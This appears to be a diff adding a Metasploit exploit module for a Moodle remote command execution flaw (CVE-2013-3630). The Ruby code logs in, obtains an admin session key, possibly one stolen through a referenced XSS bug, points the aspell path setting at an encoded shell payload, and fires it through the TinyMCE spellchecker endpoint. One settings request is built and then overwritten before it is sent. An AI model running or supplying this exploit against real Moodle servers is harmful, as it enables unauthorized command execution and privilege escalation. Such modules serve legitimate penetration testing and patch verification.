@@ -1,0 +1,163 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rexml/document'
+
+class Metasploit4 < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+    'Name'           => 'Moodle Remote Command Execution',
+    'Description'    => %q{
+    Moodle allows an authenticated user to define spellcheck settings via the web interface.
+    The user can update the spellcheck mechanism to point to a system-installed aspell binary.
+    By updating the path for the spellchecker to an arbitrary command, an attacker can run
+    arbitrary commands in the context of the web application upon spellchecking requests.
+
+    This module also allows an attacker to leverage another privilege escalation vuln.
+    Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey
+    and use this to escalate privileges to that of an admin, allowing the module to pop a shell
+    as a previously unprivileged authenticated user.
+
+    This module was tested against Moodle version 2.5.2 and 2.2.3.
+    },
+    'License'        => MSF_LICENSE,
+    'Author'         =>
+      [
+        'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
+      ],
+    'References'     =>
+      [
+        ['CVE', '2013-3630'],
+        ['EDB', '28174'], #xss vuln allowing sesskey of admins to be stolen
+        ['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats']
+      ],
+    'Payload'        =>
+    {
+      'Compat'     =>
+      {
+        'PayloadType'  => 'cmd',
+        'RequiredCmd'  => 'generic perl ruby bash telnet python',
+      }
+    },
+    'Platform'       => ['unix', 'linux'],
+    'Arch'           => ARCH_CMD,
+    'Targets'        => [['Automatic',{}]],
+    'DisclosureDate' => 'Oct 30 2013',
+    'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
+      OptString.new('PASSWORD', [ true, "Password to authenticate with", '']),
+      OptString.new('SESSKEY', [ false, "The session key of the user to impersonate", ""]),
+      OptString.new('TARGETURI', [ true, "The URI of the Moodle installation", '/moodle/'])
+    ], self.class)
+  end
+
+  def exploit
+    init = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, '/index.php')
+    })
+
+    sess = init.get_cookies
+
+    post = {
+      'username' => datastore["USERNAME"],
+      'password' => datastore["PASSWORD"]
+    }
+
+    print_status("Authenticating as user: " << datastore["USERNAME"])
+
+    login = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, '/login/index.php'),
+      'vars_post' => post,
+      'cookie' => sess
+    })
+
+    if !login or login.code != 303
+      fail_with("Login failed")
+    end
+
+    sess = login.get_cookies
+
+    print_status("Getting session key to update spellchecker if no session key was specified")
+
+    sesskey = ''
+    if datastore['SESSKEY'] == ''
+      tinymce = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, '/admin/settings.php') + '?section=editorsettingstinymce',
+        'cookie' => sess
+      })
+
+      tinymce.body.each_line do |line|
+        next if line !~ /name="sesskey"/
+        sesskey = line[0..line.index('>')]
+      end
+
+      if sesskey == ''
+        fail_with("Unable to get proper session key")
+      end
+
+      sesskey = REXML::Document.new sesskey
+      sesskey = sesskey.root.attributes["value"]
+    else
+      sesskey = datastore['SESSKEY']
+    end
+
+    post = {
+      'section' => 'editorsettingstinymce',
+      'sesskey' => sesskey,
+      'return' => '',
+      's_editor_tinymce_spellengine' => 'PSpellShell',
+      's_editor_tinymce_spelllanguagelist' => '%2BEnglish%3Den%2CDanish%3Dda%2CDutch%3Dnl%2CFinnish%3Dfi%2CFrench%3Dfr%2CGerman%3Dde%2CItalian%3Dit%2CPolish%3Dpl%2CPortuguese%3Dpt%2CSpanish%3Des%2CSwedish%3Dsv'
+    }
+
+    print_status("Updating spellchecker to use the system aspell")
+
+    post = {
+      'section' => 'systempaths',
+      'sesskey' => sesskey,
+      'return' => '',
+      's__gdversion' => '2',
+      's__pathtodu' => '/usr/bin/du',
+      's__aspellpath' => payload.encoded,
+      's__pathtodot' => ''
+    }
+
+    aspell = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, '/admin/settings.php'),
+      'vars_post' => post,
+      'cookie' => sess
+    })
+
+    spellcheck = '{"id":"c0","method":"checkWords","params":["en",[""]]}'
+
+    print_status("Triggering payload")
+
+    resp = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, '/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php'),
+      'data' => spellcheck,
+      'ctype' => 'application/json',
+      'cookie' => sess
+    })
+
+    if !resp or resp.code != 200
+      fail_with("Error triggering payload")
+    end
+
+  end
+end
